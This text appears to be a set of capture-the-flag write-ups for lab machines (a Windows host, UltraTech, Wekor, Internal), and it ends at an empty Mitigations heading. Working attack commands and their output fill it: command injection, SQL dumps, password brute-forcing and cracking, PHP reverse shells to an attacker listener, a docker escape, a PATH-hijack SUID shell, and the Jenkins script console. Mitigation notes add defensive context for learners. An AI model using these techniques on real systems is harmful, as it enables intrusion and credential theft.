[*] UnmarshalObject: 0x80070005
[!] Failed to impersonate security context token

0x80070005 is access-denied during the unmarshal — GodPotato didn't take on this build.

PrintSpoofer worked:

smbclient //10.48.143.113/nt4wrksv -N -U Bob%'!P@$$W0rD!123' -c 'put PrintSpoofer.exe'
curl -s ".../cmd.aspx?cmd=C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe%20-c%20%22cmd%20/c%20type%20C:\Users\Administrator\Desktop\root.txt%22"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

The output of the impersonated command doesn't come back through the webshell's stdout (PrintSpoofer spawns it in a separate process), so I redirected the SYSTEM command's output to a file in the web root and fetched it:

curl -s ".../cmd.aspx?cmd=C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer.exe%20-c%20%22cmd%20/c%20type%20C:\Users\Administrator\Desktop\root.txt%20%3E%20C:\inetpub\wwwroot\nt4wrksv\out.txt%22"
curl -s "http://10.48.143.113:49663/nt4wrksv/out.txt"
# THM{1fk5kf469devly1gl320zafgl345pv}

SYSTEM.

sections.label: Rabbit holes
sections.html:
Bill's credentials. The second decoded account (Bill : Juw4nnaM4n420696969!$$$) authenticated nowhere useful — smbmap returned "Access denied" for every share. Only Bob mattered. Two credentials in a file doesn't mean both are live.

The first off-the-shelf ASPX shell. The initial webshell I pulled down rendered its HTML form but wouldn't actually run a command through the query string — it expected its own POST fields (xpath/xcmd), and even then didn't execute in this setup. Writing a tiny purpose-built shell that reads Request["cmd"] was faster than fighting someone else's.

GodPotato. I tried GodPotato before PrintSpoofer and it failed with Failed to impersonate security context token (0x80070005). Not every potato works on every build — when one fails at the impersonation step, swap it for another rather than assuming the privilege isn't exploitable.

Capturing SYSTEM output. PrintSpoofer's -c runs the command in a new process whose stdout doesn't return through the webshell. Redirecting to a file inside the web root (> out.txt) and fetching it over HTTP is the simplest way to read the result without a full reverse shell.

sections.label: Mitigations
sections.html:
Anonymous SMB access. nt4wrksv was readable (and, with weak creds, writable) without real authentication. File shares should require authentication, and non-default shares holding anything sensitive should never allow null/guest sessions.

Credentials in a share. A passwords.txt on a readable share is game over, and base64 is not protection — it's an encoding anyone reverses in one command. Secrets do not belong in file shares in any form.

Writable directory inside a web root. The same folder being both an SMB share with write access and an IIS virtual directory meant uploaded files could be executed as code. Web roots must never be writable by untrusted users, and application directories should have script execution disabled unless required.

SeImpersonatePrivilege on a reachable service account. The IIS app-pool identity having SeImpersonatePrivilege is what turns RCE into SYSTEM. This privilege is required by some service accounts, so the real control is not letting an attacker reach code execution as that account in the first place (see the points above), plus keeping the host patched.

Weak, reused-style passwords. !P@$$W0rD!123 is exactly the kind of "complex-looking" password that falls to a wordlist. Enforce length-based passphrases and screen against breach lists.

writeups.takeawayHtml: The whole foothold hinges on one observation: a writable SMB share and an IIS virtual directory were the same folder. Write a file over SMB on 445, execute it over HTTP on 49663. Whenever you find a writable share on a Windows web server, the immediate question is "is this folder also served by the web server?" — because if it is, write access becomes code execution. The escalation is the Windows reflex worth having memorised: on any service or IIS account, run whoami /priv first. SeImpersonatePrivilege = reach for a potato (PrintSpoofer, then others if it fails). It converts "I can run code as a low-priv service account" into SYSTEM almost every time.
writeups.againHtml:
Check whether a writable share is web-served *before* writing anything else — one curl to :49663/nt4wrksv/passwords.txt confirmed the SMB-to-HTTP bridge in seconds and told me the whole plan.

Skip GodPotato and go straight to PrintSpoofer on this build; I lost a couple of minutes to GodPotato's impersonation failure. When a potato fails at UnmarshalObject / impersonation, don't debug it — switch tools.

Write my own three-line ASPX shell from the start instead of downloading one; it reads Request["cmd"], executes, and returns output with no fighting someone else's form fields.

writeups.title: UltraTech
writeups.summary: UltraTech runs a normal-looking marketing site on port 31331 and a small Node.js API on port 8081. A JavaScript file on the website points at the…
writeups.takeaway: The foothold here is a reading-comprehension exercise, not a scanning one. The API on 8081 looks locked behind /auth, and no amount of directory brute-forcing reveals the way in. The website's own api.js is what names the /ping route and shows it takes an ip parameter — client-side JavaScript is part of the attack surface, and reading it beats fuzzing. Once you have a parameter that is clearly fed to a shell utility, the only question is which separator the filter forgot. The escalation is the lesson worth memorising cold: a user in the docker group is root. docker run -v /:/mnt mounts the host's entire filesystem into a container you control as root, and nothing stops you reading or writing any file. It's not a vulnerability in Docker — it's the documented trust model — which is exactly why group membership has to be guarded like a root password.
writeups.tldrHtml: UltraTech runs a normal-looking marketing site on port 31331 and a small Node.js API on port 8081. A JavaScript file on the website points at the API's /ping route, and that route passes its ip parameter straight into a shell ping command. A newline (%0a) in the parameter turns it into arbitrary command execution as the www user. From there I read a SQLite database holding two MD5 hashes, cracked the r00t one to n100906, and used it to SSH in. The r00t user is in the docker group, so I spun up a container with the host's / mounted inside it and read everything as root. Classic docker group = root.

sections.label: Introduction
sections.html: UltraTech is a medium-rated Linux box built around two web services that only make sense when you read them together. The website on 31331 is just a front; the interesting surface is the API on 8081, and the website's own JavaScript is what tells you the API exists and which routes it has. The whole first half of the box is "read the client-side code, then talk to the API it describes." The second half is one of the most common real-world Linux escalations there is: a non-root user who can talk to the Docker daemon is effectively root already.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.48.174.133 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC

Four open ports:

PortServiceVersion
21/tcpFTPvsftpd 3.0.5
22/tcpSSHOpenSSH 8.2p1 Ubuntu
8081/tcpHTTPNode.js Express framework
31331/tcpHTTPApache httpd 2.4.41 (Ubuntu)

Two web servers on non-standard ports, plus FTP and SSH. The Express app on 8081 responded with CORS wide open (Access-Control-Allow-Origin: *) and supported a long list of methods.

Web — Port 8081 (the API)

The root of the API named itself:

curl -s http://10.48.174.133:8081/
# UltraTech API v0.1.3
curl -s http://10.48.174.133:8081/auth
# You must specify a login and a password

So there's at least an /auth route, and it wants credentials I don't have yet.

Web — Port 31331 (the website)

Port 31331 is the actual UltraTech marketing site ("BigData, AI and Blockchain experts"). Content discovery:

feroxbuster -u http://10.48.174.133:31331/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,js,json -s 200,301,302,403 -k --scan-dir-listings

The useful hit was a browsable /js/ directory containing api.js, app.js and app.min.js. robots.txt existed but led nowhere interesting.

sections.label: Foothold
sections.html:
Reading the website's JavaScript

The directory listing let me read api.js directly. It builds the API URL and calls a /ping route:

function getAPIURL() {
    return `${window.location.hostname}:8081`
}
// ...
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

That's the second route (the first being /auth), and it takes an ip parameter. A parameter named ip that feeds a function called "ping" is almost always a shell call.

Confirming the /ping route

curl -i "http://10.48.174.133:8081/ping?ip=127.0.0.1"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms
...

The server runs the real ping binary with my input and returns its output. That is user input reaching a shell.

Command injection

A semicolon got mangled, but a URL-encoded newline (%0a) broke out cleanly and ran a second command:

curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0aid"
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
...
uid=1002(www) gid=1002(www) groups=1002(www)

Command execution as the www user.

sections.label: Shell and access
sections.html:
Rather than throw a reverse shell immediately, I enumerated through the injection with curl, URL-encoding each command.

curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0als%20-la%20/home"
drwxr-xr-x  5 lp1    lp1    4096 Mar 22  2019 lp1
drwxr-xr-x  2 r00t   r00t   4096 Mar 22  2019 r00t
drwxr-xr-x  4 ubuntu ubuntu 4096 Oct 26  2025 ubuntu
drwxr-xr-x  5 www    www    4096 Mar 22  2019 www

r00t is a real user with a home directory and, from /etc/passwd, a /bin/bash shell — a likely SSH target if I can find a password.

Hunting for a database:

curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0afind%20/%20-name%20'*.db'%20-o%20-name%20'*.sqlite*'%202%3E/dev/null"
/home/www/api/utech.db.sqlite

The API's own SQLite database. There's no sqlite3 binary on the box, but strings is enough:

curl -s "http://10.48.174.133:8081/ping?ip=127.0.0.1%0astrings%20/home/www/api/utech.db.sqlite"
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        )
r00t  f357a0c52799563c7c7b76c1e7543a32
admin 0d0ea5111e3c1def594c1684e3b9be84

Two MD5 hashes. The r00t row is the one I want.

Cracking the hash

echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
n100906          (?)
1g 0:00:00:00 DONE ...

r00t : n100906.

SSH

ssh r00t@10.48.174.133
# password: n100906
r00t@ip-10-48-174-133:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

A real interactive shell as r00t — and the id output is the whole ballgame: groups=...,116(docker).

sections.label: Escalation
sections.html:
r00t is a member of the docker group. The Docker daemon runs as root, and any member of the docker group can tell it to start a container. If you start a container with the host's root filesystem mounted inside it, you are root on that filesystem — no exploit, no password, just the daemon doing exactly what it's designed to do.

docker images
# bash   latest   495d6437fc1e   7 years ago   15.8MB

There's already a bash image pulled, so I don't even need to download one.

sections.label: The full chain
sections.html:
Mount the host's / at /mnt inside a throwaway container:

docker run -v /:/mnt --rm -it bash

Inside the container I'm root, and /mnt is the real host filesystem. From there I can read anything, including root's SSH key:

bash-5.0# cat /mnt/root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
...（trimmed — full key stays on the box）...
-----END RSA PRIVATE KEY-----

(The room asks only for the first nine characters of the key, MIIEogIBA; I've trimmed the rest here rather than reprint a private key.)

With root's key, or just by reading files straight off /mnt, every flag and answer on the box is available.

sections.label: Rabbit holes
sections.html:
The /auth route. Early on, /auth looked like the intended way in, and I spent a little time poking at it with test credentials and both GET and POST. It only returns "Invalid credentials" or a framework 404 for POST. /auth is not the foothold — it's there to make you think the API is credential-gated. The way in is the *other* route, /ping, which the website's own JavaScript hands you.

Feroxbuster on port 8081. Directory brute-forcing the API found only / and /auth (and case variants). The API has no hidden directories worth chasing; its routes are defined in the client-side JS, not discoverable by path brute force. Reading api.js was worth more than the scan.

Semicolon injection. My first injection attempt used ;id, which came back as ping: 127.0.0.1id: Name or service not known — the semicolon was swallowed into the ping argument. The newline (%0a) is what actually breaks the command apart. When one separator fails, try the others before concluding the input is sanitised.

hashcat with no GPU. I reached for hashcat -m 0 first and it bailed with No OpenCL / CUDA platform found — this VM has no GPU runtime. John cracked the same MD5 on CPU in under a second. For a single fast-hash, John on CPU is the quicker path anyway.

sections.label: Mitigations
sections.html:
Command injection in /ping. The root cause is user input (ip) reaching a shell command. The fix is to never build a shell string from user input: validate ip against a strict IPv4/IPv6 pattern and reject anything else, and call ping through an argument array (execFile('ping', ['-c','1', ip])) rather than a shell so metacharacters like newlines can't inject new commands.

Secrets reachable from the web user. The SQLite database of credentials sat in the API's own directory, readable by the www service account. Even without the injection, any file-read bug would have leaked it. Credentials should be hashed with a slow, salted algorithm (bcrypt/argon2, not bare MD5) and the datastore should not be world- or service-readable from the web root.

docker group membership. Putting r00t in the docker group granted implicit root. Membership in docker should be treated as equivalent to sudo with no password — only truly privileged admins belong there. Where containers must be managed by less-trusted users, use rootless Docker or a brokered API that constrains what can be mounted.

MD5 for passwords. Both stored hashes were unsalted MD5, which fall to a wordlist instantly. Password verification should use bcrypt or argon2id.

writeups.takeawayHtml: The foothold here is a reading-comprehension exercise, not a scanning one. The API on 8081 looks locked behind /auth, and no amount of directory brute-forcing reveals the way in. The website's own api.js is what names the /ping route and shows it takes an ip parameter — client-side JavaScript is part of the attack surface, and reading it beats fuzzing. Once you have a parameter that is clearly fed to a shell utility, the only question is which separator the filter forgot. The escalation is the lesson worth memorising cold: a user in the docker group is root. docker run -v /:/mnt mounts the host's entire filesystem into a container you control as root, and nothing stops you reading or writing any file. It's not a vulnerability in Docker — it's the documented trust model — which is exactly why group membership has to be guarded like a root password.
writeups.againHtml:
Read api.js before running feroxbuster, not after. The single most useful artifact on the box is that file, and it's linked from the site's own pages — the directory scan was wasted motion once the JS pointed straight at /ping.

On getting any shell as a service user, run id first. Here groups=...,116(docker) would have told me the escalation path before I'd even looked at the database — I could have planned the whole second half from the first id through the injection.

Skip hashcat on a GPU-less VM and go straight to john for a single fast hash. I lost a few seconds to the OpenCL error for no reason.

writeups.title: Wekor
writeups.summary: Wekor's web root hides a vhost, site.wekor.thm, running a custom "it-next" shop and a WordPress blog. The shop's coupon field (it_cart.php,…
writeups.takeaway: Wekor is an exercise in not getting lost. The web layer is noisy on purpose; the discipline is to follow the one real lead (the vhost) and the one real bug (the coupon SQLi) instead of every path a scanner prints. The two escalations are both "information and trust" problems rather than exploits: memcached hands you a password because nothing stops it, and the sudo binary runs as root but trusts $PATH to find python. The escalation lesson worth keeping: when a privileged binary calls another program by name (not absolute path), check every writable directory on the effective $PATH/secure_path. A single group-writable directory like /usr/sbin turns "I can run this as root" into "I control what runs as root."
writeups.tldrHtml: Wekor's web root hides a vhost, site.wekor.thm, running a custom "it-next" shop and a WordPress blog. The shop's coupon field (it_cart.php, coupon_code) is SQL-injectable; sqlmap dumps the wordpress database, and WordPress user wp_yura's phpass hash cracks to soccer13. Logging into WordPress as yura and editing a theme file to a PHP reverse shell gives a www-data shell. On the box, a local memcached instance (127.0.0.1:11211) is caching the Orka user's credentials in plaintext (OrkAiSC00L24/7$), so su Orka gets the user flag. Orka may sudo a root-owned bitcoin binary, which internally runs python /home/Orka/Desktop/transfer.py by relative path; since /usr/sbin is group-writable by Orka and sits on sudo's secure_path, dropping a malicious python there and running the binary executes it as root — a SUID root bash and the root flag.

sections.label: Introduction
sections.html: Wekor is a hard, long Linux box that is really five smaller challenges back-to-back: vhost discovery, a SQL-injectable custom shop, WordPress credential cracking, a reverse shell, and then two privilege escalations (an information leak through memcached, and a PATH-hijack of a sudo-able binary). Nothing requires a 0-day, but you have to chain carefully and not get lost — the web surface is deliberately noisy, and the final escalation hinges on spotting that a privileged binary calls an interpreter by a name rather than a full path.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.48.175.59 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC

Only 22 (SSH) and 80 (HTTP, Apache 2.4.18 on Ubuntu 16.04).

Web discovery

feroxbuster -u http://10.48.175.59/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,js,json

robots.txt lists several bait paths, but the real lead is /comingreallysoon/, which hints that the site has moved to a virtual host. Adding site.wekor.thm to /etc/hosts and browsing it reveals a custom shop application under /it-next/ and a WordPress install under /wordpress/.

sections.label: Foothold
sections.html:
SQL injection in the shop

The shop's cart accepts a coupon code. That coupon_code POST parameter is injectable:

sqlmap -u "http://10.48.175.59/it-next/it_cart.php" \
  --data="coupon_code=1&apply_coupon=Apply+Coupon" --batch
Payload: coupon_code=1' UNION ALL SELECT NULL,CONVERT(...),NULL#&apply_coupon=Apply Coupon
back-end DBMS: MySQL >= 5.6
available databases [6]: coupons, information_schema, mysql, performance_schema, sys, wordpress

The wordpress database is the prize. Dumping wp_users:

sqlmap -u "http://10.48.175.59/it-next/it_cart.php" --data="coupon_code=1&apply_coupon=Apply+Coupon" --batch -D wordpress -T wp_users --dump
| user_login | user_pass                                      |
| admin      | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.             |
| wp_jeffrey | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10            |
| wp_yura    | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/   (soccer13) |
| wp_eagle   | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/             |

Cracking the hash

sqlmap/John recognised the phpass hashes and cracked wp_yura against rockyou:

john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt --fork=4 wp.txt
# wp_yura : soccer13

sections.label: Shell and access
sections.html:
WordPress user wp_yura can log in at site.wekor.thm/wordpress/wp-login.php with soccer13. yura has theme-editing rights, so I replaced a theme PHP file (e.g. 404.php) with a PHP reverse shell, started a listener, and triggered the page:

nc -lvnp 4444
Connection received ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@osboxes:/$

A home directory exists for Orka, but it's locked down to www-data:

www-data@osboxes:/$ ls -la /home/Orka/user.txt
# Permission denied

So www-data needs to become Orka.

sections.label: Escalation
sections.html:
Two hops:

  1. www-data → Orka via credentials leaked from a local memcached cache.
  2. Orka → root via a sudo-able binary that calls python by relative path, combined with a writable secure_path directory.

sections.label: The full chain
sections.html:
www-data Orka (memcached leak)

Enumerating local services turned up memcached listening on 127.0.0.1:11211. memcached has no authentication; its keys can be listed and read directly:

printf 'get username\r\n' | nc 127.0.0.1 11211
# VALUE username 0 4
# Orka
printf 'get password\r\n' | nc 127.0.0.1 11211
# VALUE password 0 15
# OrkAiSC00L24/7$

The app had cached the Orka user's own login in memcached in plaintext:

su Orka      # password: OrkAiSC00L24/7$
Orka@osboxes:/tmp$ cat ~/user.txt
1a26a6d51c0172400add0e297608dec6

Orka root (sudo binary + relative python + writable secure_path)

sudo -l
# User Orka may run the following commands on osboxes:
#     (root) /home/Orka/Desktop/bitcoin

bitcoin is a 32-bit ELF. strings/objdump show two things: the password check is a plain strcmp against the literal password, and after a correct password it calls:

system("python /home/Orka/Desktop/transfer.py %c")

It invokes python by name, not by absolute path, so it relies on $PATH (here, sudo's secure_path). Checking the directories on secure_path:

ls -ld /usr/sbin /usr/local/sbin
# drwxrwxr-x 2 root Orka 12288 ... /usr/sbin        <-- group Orka, group-writable

/usr/sbin is writable by the Orka group and comes before /usr/bin on secure_path. So I plant a malicious python there that makes a SUID copy of bash, then run the sudo binary with the known password and any valid amount:

cat > /usr/sbin/python <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /usr/sbin/python

echo -e 'password\n1' | sudo /home/Orka/Desktop/bitcoin
# Enter the password : Access Granted...

bitcoin runs as root, calls python ..., and resolves python to my script — which runs as root:

ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root ... /tmp/rootbash
/tmp/rootbash -p
rootbash-4.3# cat /root/root.txt
f4e788f87cc3afaecbaf0f0fe9ae6ad7

Root.

sections.label: Rabbit holes
sections.html:
robots.txt bait and LFI guesses. robots.txt and early fuzzing surface a lot of paths (workshop, agent, feed, crawler, etc.) and an index.php?page= that looked LFI-able via php://filter. None of it is the way in — the real lead is the /comingreallysoon/ pointer to the site.wekor.thm vhost. Don't sink time into every path a wordlist returns.

The other WordPress users. admin, wp_jeffrey and wp_eagle hashes came out of the dump too. wp_eagle even cracked, but wp_yura is the account that matters (theme-edit path to a shell). More cracked hashes isn't more progress unless the account can do something.

Kernel exploits for root. With a www-data shell I briefly went down the kernel-exploit road (CVE-2021-22555 netfilter, CVE-2022-32250) — compiling 32-bit exploits, fighting multilib. That's the wrong path: the box wants the memcached leak → Orka → sudo binary chain. On a box this curated, an unauthenticated local service (memcached on 11211) and a sudo -l entry are far likelier intended routes than a kernel LPE. Enumerate services and sudo before reaching for kernel CVEs.

Entering the bitcoin password interactively. Early sudo bitcoin runs returned "Access Denied" because I guessed the password. It's recoverable statically — the binary strcmps the input against the literal string password. Reading the binary beats guessing.

sections.label: Mitigations
sections.html:
SQL injection in the shop. The coupon_code parameter is concatenated into a query. Use parameterised queries / prepared statements everywhere, and apply least-privilege to the DB account so one injectable form can't read the entire wordpress database.

Weak WordPress passwords. soccer13 falls to rockyou instantly. Enforce strong passwords, limit login attempts, and don't give every author theme/plugin-edit rights — DISALLOW_FILE_EDIT in wp-config.php removes the theme-editor-to-webshell path entirely.

Unauthenticated memcached caching secrets. memcached on 127.0.0.1:11211 had no auth and cached a user's credentials in plaintext. Never cache secrets in memcached; bind it to a socket or firewall it, and treat anything in it as readable by any local user.

sudo binary calling an interpreter by relative name. bitcoin running system("python ...") with a bare python is the root cause. Privileged programs must call interpreters and helpers by absolute path and sanitise $PATH. Equally, /usr/sbin must not be group-writable, and it certainly must not be writable by a user who is on secure_path.

A hard-coded password in a binary. The bitcoin access check is a strcmp against a literal — trivially recovered. Authentication secrets do not belong compiled into a distributed binary.

writeups.takeawayHtml: Wekor is an exercise in not getting lost. The web layer is noisy on purpose; the discipline is to follow the one real lead (the vhost) and the one real bug (the coupon SQLi) instead of every path a scanner prints. The two escalations are both "information and trust" problems rather than exploits: memcached hands you a password because nothing stops it, and the sudo binary runs as root but trusts $PATH to find python. The escalation lesson worth keeping: when a privileged binary calls another program by name (not absolute path), check every writable directory on the effective $PATH/secure_path. A single group-writable directory like /usr/sbin turns "I can run this as root" into "I control what runs as root."
writeups.againHtml:
Enumerate local services and sudo -l *before* touching kernel exploits. The memcached on 11211 and the (root) bitcoin sudo entry are the intended path; the time spent on CVE-2021-22555/CVE-2022-32250 was wasted on a curated box that clearly wanted the service-leak chain.

Read the bitcoin binary first instead of guessing its password — one strings/objdump pass shows both the literal password and the relative python call, which hands you the entire escalation in a minute.

On the web side, pin on the vhost immediately: /comingreallysoon/ is the signpost, and ffuf with a Host: header confirms site.wekor.thm. Everything real lives there, so there's no need to exhaust the root site's wordlist first.

writeups.title: Internal
writeups.summary: An Apache default page hides a WordPress 5.4.2 install at /blog/. WPScan finds the admin username, Hydra cracks the password, and WordPress's own…
writeups.takeaway: The big lesson here is that "internal-only" is not a security control once the perimeter is breached once. Jenkins trusted its Docker-bridge binding as sufficient isolation, but a single WordPress credential-stuffing success gave www-data, which led to aubreanna, who had SSH access, which is all it took to reach the "internal" Jenkins over a loopback forward. Defense needs to assume lateral movement is possible and authenticate every service on its own merits, not on the assumption that nothing malicious already has a foothold on the host. The secondary pattern worth remembering: WordPress's Theme/Plugin Editor is functionally an authenticated webshell dropper built into core. Any time file-upload restrictions are blocking a shell, check whether an in-app code editor exists that writes to disk without going through that same validation path.
writeups.tldrHtml: An Apache default page hides a WordPress 5.4.2 install at /blog/. WPScan finds the admin username, Hydra cracks the password, and WordPress's own Theme Editor becomes the shell vector — editing 404.php in place sidesteps the upload filter entirely, since the editor writes straight to disk and any extension restriction only applies to the upload form. That lands a www-data shell. A plaintext credentials file in /opt hands over SSH access as aubreanna, and from there a text file in her home directory reveals a Jenkins instance running inside a Docker container, reachable only on the container's internal IP. SSH local port forwarding exposes it, Hydra cracks the Jenkins login, and the built-in Groovy Script Console gives code execution as the jenkins user — which is enough to read a plaintext root password left behind in the container's /opt.

sections.label: Introduction
sections.html:
Internal is a multi-stage "black box" box that chains a web app foothold into an internal-network pivot. The name is accurate: the real target isn't the WordPress install at all, it's a Jenkins instance that was never meant to be reachable from outside the host — it's bound to a Docker bridge address that only exists on the box itself.

The room rewards methodical enumeration at every stage rather than any single clever exploit: a directory scan that doesn't stop at the Apache default page, a grep through world-readable files after each foothold, and recognizing docker0 in ifconfig/ip a output as a sign there's a second network to go looking in.

sections.label: Recon
sections.html:
Port Scan

rustscan -a 10.49.147.221 --ulimit 5000 -b 500 -t 1500 -- -Pn -sV -sC
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works

Two ports. The HTTP title gives away nothing — it's the stock Apache placeholder page. That's a cue to enumerate harder, not a sign the box is empty.

Web Recon — Port 80

feroxbuster -u http://10.49.147.221 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak,js,json \
  -s 200,301,302,403 \
  -k --scan-dir-listings
200  GET  http://10.49.147.221/blog/
301  GET  http://10.49.147.221/wordpress/
200  GET  http://10.49.147.221/phpmyadmin/
200  GET  http://10.49.147.221/blog/wp-login.php

The default page was a decoy. /blog/ is a live WordPress 5.4.2 install, /wordpress/ redirects into it, and /phpmyadmin/ is sitting there too (never exploited directly — WordPress was the faster path).

Added the virtual host to /etc/hosts since WordPress redirects to internal.thm internally:

10.49.147.221   internal.thm

WordPress Enumeration

wpscan --url http://internal.thm/blog \
  --enumerate u \
  --plugins-detection aggressive \
  -t 10
[+] WordPress version 5.4.2 identified (Insecure, released 2020-06-10, 71 known vulnerabilities)

[+] Enumerating Users (via Passive and Aggressive Methods)
[+] user 'admin' found

One confirmed username: admin. No plugin-based vulnerabilities worth chasing — the login itself is the path in.

sections.label: Foothold
sections.html:
Credential Brute Force — WordPress Login

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  internal.thm \
  http-post-form \
  "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fblog%2Fwp-admin%2F&testcookie=1:incorrect" \
  -t 4
[80][http-post-form] host: internal.thm   login: admin   password: my2boys

Credentials: admin:my2boys

sections.label: Shell and access
sections.html:
Logged into /blog/wp-admin with admin:my2boys. Direct file upload is blocked:

php-reverse-shell.php — Sorry, this file type is not permitted for security reasons.

Renaming to .php5 and .php.html wasn't tried past a couple of attempts — the Appearance → Theme Editor sidesteps the upload filter entirely, since it writes PHP straight to the theme directory on disk rather than going through any upload validation.

Navigation: Appearance → Theme Editor → 404 Template (404.php)

404.php was picked deliberately: low-traffic, unlikely to be hit by normal site browsing, so the shell wouldn't get accidentally triggered or clobbered before it was needed.

Pasted in the pentestmonkey PHP reverse shell, pointed at a listener:

$ip = '10.10.14.92';
$port = 4444;
nc -lvnp 4444

Rabbit Hole — Wrong Trigger URL

First attempt to trigger it was http://internal.thm/blog/404.php, which just returns WordPress's own 404 page — no code execution. WordPress intercepts the request and renders its 404 template through its own routing before the raw file content is ever touched that way.

The theme file has to be hit directly on disk, bypassing WordPress's router entirely:

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

That triggered the listener:

www-data@internal:/$

Stabilized immediately:

python -c 'import pty; pty.spawn("/bin/bash")'

Enumeration as www-data

ls /home
# aubreanna

ls /home/aubreanna
# ls: cannot open directory '/home/aubreanna': Permission denied

ls /opt
# containerd  wp-save.txt
cat /opt/wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

World-readable credentials sitting in /opt — the second foothold, handed over for free.

sections.label: Escalation
sections.html:
ssh aubreanna@internal.thm
# Password: bubb13guM!@#123
aubreanna@internal:~$
sudo -l
# Sorry, user aubreanna may not run sudo on internal.

find / -perm -4000 -type f 2>/dev/null
# standard SUID set only, nothing unusual

getcap -r / 2>/dev/null
# /usr/bin/mtr-packet = cap_net_raw+ep   (not useful)

cat ~/.bash_history
# reset / clear / id / ls / clear / curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080

sudo and SUID are both dead ends. The bash history is the tell — something's being probed on localhost:8080.

grep -ri jenkins /home/aubreanna /opt /var 2>/dev/null
/home/aubreanna/jenkins.txt:Internal Jenkins service is running on 172.17.0.2:8080
ss -tlnp | grep 8080
# LISTEN  0  128  127.0.0.1:8080  0.0.0.0:*

172.17.0.2 is a Docker bridge address — docker0 showed up in the SSH login banner (IP address for docker0: 172.17.0.1) too. Jenkins is running inside a container, and something is already forwarding 127.0.0.1:8080 toward it on the host — but that local binding is occupied, so a fresh local port is needed to reach it as the attacker.

sections.label: The full chain
sections.html:
Step 1 — Tunnel to Jenkins

ssh -fN -L 8080:172.17.0.2:8080 aubreanna@internal.thm
bind [127.0.0.1]:8080: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 8080

Port 8080 locally is already in use by this same session's prior forward attempt. Used 8081 instead:

ssh -fN -L 8081:172.17.0.2:8080 aubreanna@internal.thm
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8081
# 403

Jenkins is up and reachable through the tunnel.

Step 2 — Brute Force Jenkins Login

hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost \
  http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" \
  -s 8081 -t 4
[8081][http-post-form] host: localhost   login: admin   password: spongebob

Credentials: admin:spongebob

Step 3 — Groovy Script Console RCE

Navigation: Manage Jenkins → Script Console (/script)

Confirmed code execution as the Jenkins process user:

def p = ['sh','-c','id'].execute()
println p.text
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

Read the note Will left in the container for Aubreanna:

println "cat /opt/note.txt".execute().text
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:tr0ub13guM!@#123

Root credentials, recovered without ever needing a full interactive shell inside the container.

Step 4 — Root

ssh root@internal.thm
# Password: tr0ub13guM!@#123
root@internal:~#

sections.label: Rabbit holes
sections.html:
cve-2026-87902-poc against the WordPress install: Tried a published CVE proof-of-concept against the blog before falling back to brute force. It ran but found nothing ([-] no published page found). The CVE angle was a dead end; straightforward credential brute force against wp-login.php was the actual path in.

Direct file upload for the reverse shell: Spent time trying .php5 and .php.html extensions to get the upload form to accept the PHP reverse shell before switching to the Theme Editor, which bypasses the upload filter entirely by writing to disk directly.

Triggering the shell at /blog/404.php: The intuitive URL for a "404 template" is to hit a page that returns a 404. That just renders WordPress's own 404 page through its router — no code runs. The theme file has to be requested directly from its path under wp-content/themes/, bypassing WordPress's request handling altogether.

Probing localhost:8080 before the forward was properly set up: Got a 403 and briefly treated it as a trap or honeypot rather than confirmation that something real (Jenkins) was listening behind it. Pivoted to systematic privesc enumeration first, which is how the jenkins.txt hint got found — then came back to the port with more context.

sections.label: Mitigations
sections.html:
